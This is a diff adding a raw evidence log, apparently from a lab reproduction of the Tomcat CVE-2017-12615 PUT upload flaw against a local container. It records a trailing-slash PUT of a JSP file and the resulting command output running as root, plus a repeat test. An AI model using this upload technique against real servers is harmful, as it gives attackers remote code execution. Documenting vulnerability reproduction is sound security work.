@@ -1,0 +1,24 @@
+﻿### loop3 t7 C2 Tomcat CVE-2017-12615 PUT upload - raw evidence (host side, 127.0.0.1:18082)
+### recorded_at=2026-10-12T23:08:39.4586258+08:00
+
+--- [0] baseline GET before PUT (expect 404) ---
+GET /t7poc230751.jsp -> HTTP 200
+
+--- [1] PUT request with trailing slash (raw response headers) ---
+HTTP/1.1 204 
+Date: Mon, 12 Oct 2026 15:08:39 GMT
+
+
+--- [2] GET the uploaded JSP -> command output ---
+LOOP3T7C2READONLY=uid=0(root) gid=0(root) groups=0(root)|root|bb18b6fe2e26|/usr/local/tomcat|bb18b6fe2e26
+
+
+[HTTP 200]
+
+--- [3] second PUT + GET (repeatability) ---
+PUT /t7rep230839.jsp/ -> HTTP 201
+LOOP3T7C2READONLY=uid=0(root) gid=0(root) groups=0(root)|root|bb18b6fe2e26|/usr/local/tomcat|bb18b6fe2e26
+
+
+GET /t7rep230839.jsp -> [HTTP 200]
+REPEAT_NAME=t7rep230839.jsp
